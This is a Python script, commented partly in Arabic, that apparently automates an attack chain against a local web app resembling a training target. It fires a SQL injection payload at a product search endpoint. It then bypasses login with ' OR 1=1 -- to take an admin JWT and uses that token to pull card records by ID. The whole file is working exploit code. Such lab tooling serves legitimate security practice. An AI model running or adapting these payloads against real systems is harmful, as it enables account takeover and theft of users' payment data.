import requests
from datetime import datetime

TARGET_URL = "http://localhost:3000"
REPORT_FILE = "api_report.txt"

# دالة مساعدة لطباعة النص على الشاشة وحفظه في الملف بالوقت نفسه
def log_and_write(text, file_handle):
    print(text)
    file_handle.write(text + "\n")

# --- Module 1: SQL Injection Scanner ---
def test_sqli(file_handle):
    log_and_write("\n" + "="*50, file_handle)
    log_and_write("[+] Module 1: Launching SQL Injection (SQLi) Scanner", file_handle)
    log_and_write("="*50, file_handle)
    
    sqli_endpoint = f"{TARGET_URL}/rest/products/search"
    payloads = ["')) OR 1=1 --"]
    
    for payload in payloads:
        try:
            response = requests.get(sqli_endpoint, params={'q': payload}, timeout=5)
            if response.status_code == 200 and ("data" in response.text or "id" in response.text):
                log_and_write(f"[🚨] VULNERABILITY CONFIRMED: SQLi successful with payload: {payload}", file_handle)
                log_and_write(f"[📋] PoC Data Sample: {response.text[:150]}...", file_handle)
                return True
        except Exception as e:
            log_and_write(f"[-] Error in SQLi Module: {e}", file_handle)
    log_and_write("[-] SQLi module finished testing.", file_handle)
    return False

# --- Module 2: SQLi Auth Bypass (Grabbing Token) ---
def get_token_via_sqli(file_handle):
    log_and_write("\n" + "="*50, file_handle)
    log_and_write("[+] Auth Module: Attempting SQLi Auth Bypass to grab JWT Token...", file_handle)
    log_and_write("="*50, file_handle)
    
    login_url = f"{TARGET_URL}/rest/user/login"
    sqli_login_data = {
        "email": "' OR 1=1 --",
        "password": "anything_random_here"
    }
    
    try:
        response = requests.post(login_url, json=sqli_login_data, timeout=5)
        if response.status_code == 200:
            token = response.json().get('authentication', {}).get('token')
            if token:
                log_and_write("[🚨] EXPLOIT SUCCESSFUL: Logged in via SQL Injection Authentication Bypass!", file_handle)
                log_and_write(f"[+] JWT Token grabbed successfully: {token[:30]}...", file_handle)
                return token
        log_and_write("[-] SQLi Auth Bypass failed.", file_handle)
        return None
    except Exception as e:
        log_and_write(f"[-] Error during SQLi Auth Bypass: {e}", file_handle)
        return None

# --- Module 3: Authenticated BOLA Scanner ---
def test_bola_authenticated(token, file_handle):
    log_and_write("\n" + "="*50, file_handle)
    log_and_write("[+] Module 3: Launching Authenticated BOLA Scanner", file_handle)
    log_and_write("="*50, file_handle)
    
    if not token:
        log_and_write("[-] Skipping BOLA: No valid JWT token available.", file_handle)
        return
        
    bola_endpoint = f"{TARGET_URL}/api/Cards"
    headers = {
        "Authorization": f"Bearer {token}",
        "Accept": "application/json"
    }
    
    log_and_write("[~] Fuzzing IDs with the stolen Admin Token...", file_handle)
    
    for card_id in range(1, 6):
        test_url = f"{bola_endpoint}/{card_id}"
        try:
            response = requests.get(test_url, headers=headers, timeout=5)
            if response.status_code == 200:
                log_and_write(f"[🚨] BOLA BYPASS SUCCESSFUL AT ID {card_id}!", file_handle)
                log_and_write(f"[📋] Leaked Card Info: {response.text}\n", file_handle)
            else:
                log_and_write(f"[-] ID {card_id}: Secure or returned Status {response.status_code}", file_handle)
        except Exception as e:
            log_and_write(f"[-] Error testing BOLA on ID {card_id}: {e}", file_handle)

# --- Main Engine ---
if __name__ == "__main__":
    # فتح ملف التقرير للكتابة
    with open(REPORT_FILE, "w", encoding="utf-8") as report:
        log_and_write("*"*60, report)
        log_and_write("        AUTOMATED API PENTESTING REPORT        ", report)
        log_and_write(f"        Generated on: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}", report)
        log_and_write("*"*60, report)
        log_and_write(f"[+] Target Scope: {TARGET_URL}", report)
        
        # 1. تشغيل فحص الـ SQLi
        test_sqli(report)
        
        # 2. اختراق اللوجن وجلب التوكن
        jwt_token = get_token_via_sqli(report)
        
        # 3. فحص الـ BOLA بالتوكن المسروق
        test_bola_authenticated(jwt_token, report)
        
        log_and_write("\n" + "="*50, report)
        log_and_write(f"[+] All scanning modules completed. Report saved to: {REPORT_FILE}", report)
        log_and_write("="*50, report)